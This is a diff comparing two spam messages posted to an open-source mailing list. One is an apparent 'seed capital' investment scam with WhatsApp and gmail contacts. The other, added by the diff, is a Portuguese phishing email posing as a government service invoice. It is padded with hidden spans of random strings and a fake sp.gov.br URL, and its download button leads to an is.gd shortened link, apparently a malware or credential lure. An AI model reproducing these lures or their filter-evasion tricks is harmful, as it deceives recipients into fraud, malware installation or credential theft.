@@ -2,59 +2,109 @@ Return-Path: <osst-users-bounces@lists.sourceforge.net>
 X-Original-To: lists+osst-users@lfdr.de
 Delivered-To: lists+osst-users@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id 0ED6B17027F
-	for <lists+osst-users@lfdr.de>; Wed, 26 Feb 2020 16:31:44 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id 6010E175B12
+	for <lists+osst-users@lfdr.de>; Mon,  2 Mar 2020 14:00:04 +0100 (CET)
 Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
 	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
 	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
-	id 1j6yf0-0000Ai-Qp
-	for lists+osst-users@lfdr.de; Wed, 26 Feb 2020 15:31:42 +0000
+	id 1j8kfz-0002j3-1p
+	for lists+osst-users@lfdr.de; Mon, 02 Mar 2020 13:00:03 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
  by sfs-ml-1.v29.lw.sourceforge.com with esmtps
  (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
- (envelope-from <info@euro-pinnacle.com>) id 1j6yez-0000A6-0A
- for osst-users@lists.sourceforge.net; Wed, 26 Feb 2020 15:31:41 +0000
+ (envelope-from <jaqueline@pejornal.com.br>) id 1j8kfx-0002ig-QU
+ for osst-users@lists.sourceforge.net; Mon, 02 Mar 2020 13:00:01 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Reply-To:Date:From:To:Subject:MIME-Version:
- Content-Type:Sender:Message-ID:Cc:Content-Transfer-Encoding:Content-ID:
+ d=sourceforge.net; s=x; h=Date:Reply-To:Content-Type:To:Subject:From:Sender:
+ Message-ID:Cc:MIME-Version:Content-Transfer-Encoding:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=qbTReKYT2YfKCJyDVYcIEAktgmu1ayHG3fdyUDx/kjE=; b=W5gimO3O6sPL0iGLTvJe17K7Ay
- /FjDnWo47FuTyZUQlqJu2NzGSdNZ7qV6BBQiRHXTAp9HfhBKT1oUGvDdGWJfFGpU0B0FWYIdxhJgQ
- pExXqa22i1zqRhxTYLR5y6pKb4KJL9lPSb3RrA6prsrN+Ye6ixt8SWRSTiMtBsdcGyIY=;
+ bh=1XdACurTRyu/tnygfaDt0oQ1cQEtNDvHUZu43ElCF80=; b=gPog447Xjecfw74yfL7MF7iv52
+ CEKqH6ZCZKt1fNuh1rHKBxbD8//yssPmKrnPeUyCETXlvRtL/67qnDGFaAOUhbUMafZ7kM5XuTU6S
+ wjPoqQYwJ4Ea7mOLwmpCHIAT/SCUvPxdZBAqKv0OHS1KJUl95fIzij2PIWHeWkKZPhfQ=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Reply-To:Date:From:To:Subject:MIME-Version:Content-Type:Sender:Message-ID
- :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
- Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
- References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=qbTReKYT2YfKCJyDVYcIEAktgmu1ayHG3fdyUDx/kjE=; b=O
- yOYUF4FvdHmnKkQqJ0cF6kDg1U5IlxMImii8Is/yo9DLHY4Gm7V2wTRw+bgPVABZEQD07XKvhfuQR
- c5grLmJWlyn03ZaUmmHz+23/2fBAW1XjlkpnTvZJx+Zv34yc2K9J+sZ2b4PKgYv0pLdK4xzbV2BJI
- zhku+qlNJc9hWMhM=;
-Received: from [165.22.214.51] (helo=rdns0.mandrakedining.gq)
- by sfi-mx-4.v28.lw.sourceforge.com with esmtps
+ h=Date:Reply-To:Content-Type:To:Subject:From:Sender:Message-ID:Cc:
+ MIME-Version:Content-Transfer-Encoding:Content-ID:Content-Description:
+ Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+ In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+ List-Post:List-Owner:List-Archive;
+ bh=1XdACurTRyu/tnygfaDt0oQ1cQEtNDvHUZu43ElCF80=; b=MpYMAmHPBEWUKTE33RSiPl/fFJ
+ ATj6+Hg5e1x1eOaBZy3HUmcUoGugX0UOLw/RLTyygTxVNEk/ZNwcCabAS6tS53qEAqUX0vr6ARED/
+ f8JKm6Lo08Cnaf0+MltxHZCKEB5PB27yaQFUA+nML2TAJ6StWcYu6Xm5g0knXTuQVQ7Q=;
+Received: from gateway23.websitewelcome.com ([192.185.47.80])
+ by sfi-mx-3.v28.lw.sourceforge.com with esmtps
  (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.2)
- id 1j6yex-00AMZw-Gn
- for osst-users@lists.sourceforge.net; Wed, 26 Feb 2020 15:31:40 +0000
-MIME-Version: 1.0
+ id 1j8kfr-00B2it-QP
+ for osst-users@lists.sourceforge.net; Mon, 02 Mar 2020 13:00:01 +0000
+Received: from cm11.websitewelcome.com (cm11.websitewelcome.com [100.42.49.5])
+ by gateway23.websitewelcome.com (Postfix) with ESMTP id 29D7C4A4E9
+ for <osst-users@lists.sourceforge.net>; Mon,  2 Mar 2020 06:27:15 -0600 (CST)
+Received: from srv82.prodns.com.br ([192.185.176.238]) by cmsmtp with SMTP
+ id 8kAFj4BpwSl8q8kAFjhRYd; Mon, 02 Mar 2020 06:27:15 -0600
+X-Authority-Reason: nr=8
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+ d=pejornal.com.br; s=default; h=Date:Reply-To:Content-Type:To:Subject:From:
+ Sender:Message-ID:Cc:MIME-Version:Content-Transfer-Encoding:Content-ID:
+ Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+ :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+ List-Subscribe:List-Post:List-Owner:List-Archive;
+ bh=1XdACurTRyu/tnygfaDt0oQ1cQEtNDvHUZu43ElCF80=; b=rnOwYmNOwdUj7KPLcL4WFJ9sF8
+ v3cPQLB94wG49EIvUWL1k7KyEluELnYOnlp4VUrhf/sXxm46VfHplEJ270FWdwvTUsSM6L/pzeVZj
+ bIECsc4nl7ap5M1AO7IDjfZSdFbjIdzZri/rTlOBEmxxxD3azcawD/HK0lW3gPg7yrxvFnd0kJorI
+ NNZ1YnZCWgYqCvEaGtJsNY6Zlyw4/Ss0ztpejTNXaI7yi6KGpdemY2SigwRYynLl2dK8Q4qXlxkvH
+ CcqVBsntbd9POx1L7D0Cvarwp5ux/BwDskzoWyjoguvI8e/ySCHpUadn8KTZhUGzBcSC/6IvUz0ot
+ ODUOUUMQ==;
+Received: from [189.15.201.44] (port=3801 helo=DESKTOP-PP3A8MN)
+ by srv82.prodns.com.br with esmtpsa (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256)
+ (Exim 4.92) (envelope-from <jaqueline@pejornal.com.br>)
+ id 1j8kAE-003GmY-JJ
+ for osst-users@lists.sourceforge.net; Mon, 02 Mar 2020 09:27:14 -0300
+From: "Jaqueline T. Santanna" <jaqueline@pejornal.com.br>
 To: osst-users@lists.sourceforge.net
-From: "Kyle Smith" <info@euro-pinnacle.com>
-Date: Wed, 26 Feb 2020 15:18:26 +0000
-X-Spam-Score: 5.2 (+++++)
+Date: Mon, 2 Mar 2020 09:27:14 -0300
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - srv82.prodns.com.br
+X-AntiAbuse: Original Domain - lists.sourceforge.net
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - pejornal.com.br
+X-BWhitelist: no
+X-Source-IP: 189.15.201.44
+X-Source-L: No
+X-Exim-ID: 1j8kAE-003GmY-JJ
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Source-Sender: (DESKTOP-PP3A8MN) [189.15.201.44]:3801
+X-Source-Auth: jaqueline@pejornal.com.br
+X-Email-Count: 90
+X-Source-Cap: ZzI0NWphcXVlbGluZTttYXJzaGE3ODtzcnY4Mi5wcm9kbnMuY29tLmJy
+X-Local-Domain: yes
+X-Spam-Score: 6.0 (++++++)
 X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
  See http://spamassassin.org/tag/ for more details.
- 1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
- [Blocked - see <https://www.spamcop.net/bl.shtml?165.22.214.51>]
- 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
- 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
+ 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
+ See
+ http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+ for more information. [URIs: sp.gov.br]
+ -0.0 RCVD_IN_DNSWL_NONE     RBL: Sender listed at https://www.dnswl.org/, no
+ trust [192.185.47.80 listed in list.dnswl.org]
+ -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
+ -0.0 SPF_PASS               SPF: sender matches SPF record
  1.0 HTML_MESSAGE           BODY: HTML included in message
+ 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+ 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
+ not necessarily valid
  1.0 MISSING_MID            Missing Message-Id: header
- 1.0 RDNS_NONE Delivered to internal network by a host with no rDNS
- -0.0 AWL AWL: Adjusted score from AWL reputation of From: address
-X-Headers-End: 1j6yex-00AMZw-Gn
-Subject: Re: [Osst-users] Investment Seed Capital
+ 0.1 MIME_HEADER_CTYPE_ONLY 'Content-Type' found without required MIME
+ headers
+ 0.6 HTML_MIME_NO_HTML_TAG  HTML-only message, but there is no HTML tag
+ 0.8 UPPERCASE_50_75        message body is 50-75% uppercase
+ 0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
+X-Headers-End: 1j8kfr-00B2it-QP
+Subject: [Osst-users] Nota de servicos 03260375718600757186
 X-BeenThere: osst-users@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -66,138 +116,52 @@ List-Post: <mailto:osst-users@lists.sourceforge.net>
 List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
  <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
-Reply-To: info@euro-pinnacle.com
-Content-Type: multipart/mixed; boundary="===============3647605874825525753=="
+Reply-To: jaqueline@pejornal.com.br
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============3745682342699256216=="
 Errors-To: osst-users-bounces@lists.sourceforge.net
-Message-Id: <E1j6yf0-0000Ai-Qp@sfs-ml-1.v29.lw.sourceforge.com>
+Message-Id: <E1j8kfz-0002j3-1p@sfs-ml-1.v29.lw.sourceforge.com>
 
-You will not see this in a MIME-aware mail reader.
---===============3647605874825525753==
-Content-Type: multipart/alternative; boundary="===============1293027027=="
+--===============3745682342699256216==
+Content-Type: text/html; charset=us-ascii
 
-You will not see this in a MIME-aware mail reader.
---===============1293027027==
-Content-Type: text/plain; charset="iso-8859-1"
-MIME-Version: 1.0
-Content-Transfer-Encoding: quoted-printable
-Content-Description: Mail message body
+<span style="display: none;">https://portal.fazenda.sp.gov.br/servicos/Q8JKV69ATHG8PCGJCDU0H2S2RVRDUF9Z04Y6HI1XS8AYM5E8F66JOP5GXXOWGJTBTDL9EMY/032603/</span> 
+<p>&nbsp;</p>
 
-Attn:Sir
-  =
+<span style="display: none;">Q8JKV69ATHG8PCGJCDU0H2S2RVRDUF9Z04Y6HI1XS8AYM5E8F66JOP5GXXOWGJTBTDL9EMY</span>
+<span style="display: none;">I5OAX1Y8DIJAJ4R7</span>
+<span style="display: none;">Q8JKV69ATHG8PCGJCDU0H2S2RVRDUF9Z04Y6HI1XS8AYM5E8F66JOP5GXXOWGJTBTDL9EMY</span> 
+<span style="display: none;">I5OAX1Y8DIJAJ4R7</span> 
 
-    =
-
-I have an investor looking to invest in entrepreneurial teams with big idea=
-s and a need for Seed Capital to turn their business or ideas into great Co=
-mpanies.
- =
-
-He has funds available for Investment and want them invested under you or y=
-our Company strict guidance. For more details, please reply to this email s=
-o we can discuss further.
- =
-
-Yours faithfully.
- Kyle Smith
- Mobile Whatsapp  + 1 (646) 441 8989  (USA)
- Private email:pinacletrend@gmail.com
- =20
-
---===============1293027027==
-Content-Type: text/html; charset="iso-8859-1"
-MIME-Version: 1.0
-Content-Transfer-Encoding: quoted-printable
-Content-Description: Mail message body
-
-<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
-=3Diso-8859-1"/></head><BODY><P style=3D"FONT-SIZE: small; MARGIN-BOTTOM: 0=
-px; FONT-FAMILY: Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SP=
-ACING: 0px; MARGIN-TOP: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
- rgb(34,34,34); FONT-STYLE: normal; LETTER-SPACING: normal; BACKGROUND-COLO=
-R: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font=
--variant-caps: normal; text-decoration-style: initial; text-decoration-colo=
-r: initial">Attn:Sir</P>
-<P>
-<TABLE style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif=
-; WIDTH: 117pt; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: co=
-llapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-=
-STYLE: normal; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); =
-TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
-; text-decoration-style: initial; text-decoration-color: initial" cellSpaci=
-ng=3D0 cellPadding=3D0 width=3D156 border=3D0>
-<COLGROUP>
-<COL style=3D"WIDTH: 117pt" width=3D156></COLGROUP>
-<TBODY>
-<TR style=3D"HEIGHT: 15pt" height=3D20></TR></TBODY></TABLE><SPAN style=3D"=
-FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WHITE-SPACE: n=
-ormal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 4=
-00; COLOR: rgb(34,34,34); FONT-STYLE: normal; DISPLAY: inline !important; L=
-ETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px=
-; font-variant-ligatures: normal; font-variant-caps: normal; text-decoratio=
-n-style: initial; text-decoration-color: initial">I have an investor lookin=
-g to invest in entrepreneurial teams with big ideas and a need for Seed Cap=
-ital to turn their business or ideas into great Companies.</SPAN><SPAN styl=
-e=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WHITE-SPA=
-CE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIG=
-HT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; DISPLAY: inline !importa=
-nt; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
-: 0px; font-variant-ligatures: normal; font-variant-caps: normal; text-deco=
-ration-style: initial; text-decoration-color: initial"></SPAN></P>
-<P style=3D"FONT-SIZE: small; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial, Helve=
-tica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0px; =
-TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
-ormal; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-IND=
-ENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; text-d=
-ecoration-style: initial; text-decoration-color: initial"><BR>He has funds =
-available for Investment and want them invested under you or your Company s=
-trict guidance. For more details, please reply to this email so we can disc=
-uss further.<BR>&nbsp;<BR>Yours faithfully.</P>
-<P style=3D"FONT-SIZE: small; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial, Helve=
-tica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0px; =
-TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
-ormal; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-IND=
-ENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; text-d=
-ecoration-style: initial; text-decoration-color: initial">Kyle Smith</P>
-<P style=3D"FONT-SIZE: small; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial, Helve=
-tica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0px; =
-TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
-ormal; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-IND=
-ENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; text-d=
-ecoration-style: initial; text-decoration-color: initial">Mobile Whatsapp&n=
-bsp; + 1 (646) 441 8989&nbsp; (USA)</P>
-<P style=3D"FONT-SIZE: small; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial, Helve=
-tica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0px; =
-TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
-ormal; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-IND=
-ENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; text-d=
-ecoration-style: initial; text-decoration-color: initial">Private email:<SP=
-AN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, RobotoDraft, Helvetica, A=
-rial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: n=
-one; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: norma=
-l; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: norma=
-l; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligat=
-ures: normal; font-variant-caps: normal; text-decoration-style: initial; te=
-xt-decoration-color: initial; -webkit-text-stroke-width: 0px">pinacletrend@=
-gmail.com</SPAN></P>
-<DIV class=3Dyj6qo></DIV>
-<DIV class=3DadL><BR style=3D"FONT-SIZE: 13px; FONT-FAMILY: Tahoma, Geneva,=
- sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; =
-FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WID=
-OWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-IN=
-DENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; text-=
-decoration-style: initial; text-decoration-color: initial; -webkit-text-str=
-oke-width: 0px"></DIV></BODY></HTML>
---===============1293027027==--
+<p>NFe emitida de servi&ccedil;os prestados</p>
+<p>
+<span style="display: none;">Q8JKV69ATHG8PCGJCDU0H2S2RVRDUF9Z04Y6HI1XS8AYM5E8F66JOP5GXXOWGJTBTDL9EMY</span> 
+<span style="display: none;">I5OAX1Y8DIJAJ4R7</span> 
+  <span style="font-size: 10.0pt; font-family: Verdana,sans-serif;">N&uacute;mero da NF : 032603757186</span> 
+<span style="display: none;">Q8JKV69ATHG8PCGJCDU0H2S2RVRDUF9Z04Y6HI1XS8AYM5E8F66JOP5GXXOWGJTBTDL9EMY</span> 
+<span style="display: none;">I5OAX1Y8DIJAJ4R7</span> 
+<span style="font-size: 10.0pt; font-family: Verdana,sans-serif;"><br>Raz&atilde;o Social : Santanna & Soares Capital MEI</span> 
+<span style="display: none;">Q8JKV69ATHG8PCGJCDU0H2S2RVRDUF9Z04Y6HI1XS8AYM5E8F66JOP5GXXOWGJTBTDL9EMY</span> 
+<span style="font-size: 10.0pt; font-family: Verdana,sans-serif;"><br> CCM : 5798</span> 
+<span style="display: none;">Q8JKV69ATHG8PCGJCDU0H2S2RVRDUF9Z04Y6HI1XS8AYM5E8F66JOP5GXXOWGJTBTDL9EMY</span> 
+<p>
+<span style="font-size: 10.0pt; font-family: Verdana,sans-serif;">Segue a baixo:<br /><br /></span> 
+<span style="display: none;">Q8JKV69ATHG8PCGJCDU0H2S2RVRDUF9Z04Y6HI1XS8AYM5E8F66JOP5GXXOWGJTBTDL9EMY</span> 
+<span style="display: none;">I5OAX1Y8DIJAJ4R7</span> 
+<span style="display: none;">573GWOOF4YN2OZYHGWRJ8HEDXMAHEN3Y8SBZ4MIXBVIF7XGW4CVVULEMP0ECTHIT3YWWS39YP6N</span> 
+<span style="font-size: 10pt;"><strong><a style="padding: 10px; width: 200px; text-decoration: none; border-radius: 5px; color: #ffffff; background: #000080;" href="https://is.gd/jcObhi?032603757186032603/#Q8JKV69ATHG8PCGJCDU0H2S2RVRDUF9Z04Y6HI1XS8AYM5E8F66JOP5GXXOWGJTBTDL9EMY" target="_blank" rel="noopener">NF_doc : 0326030757186</a></strong></span></p>
+<p><span style="font-size: 10.0pt; font-family: Verdana,sans-serif;">&nbsp;</span></p>
 
 
---===============3647605874825525753==
+
+--===============3745682342699256216==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============3647605874825525753==
+--===============3745682342699256216==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -208,5 +172,4 @@ Osst-users mailing list
 Osst-users@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/osst-users
 
---===============3647605874825525753==--
-
+--===============3745682342699256216==--
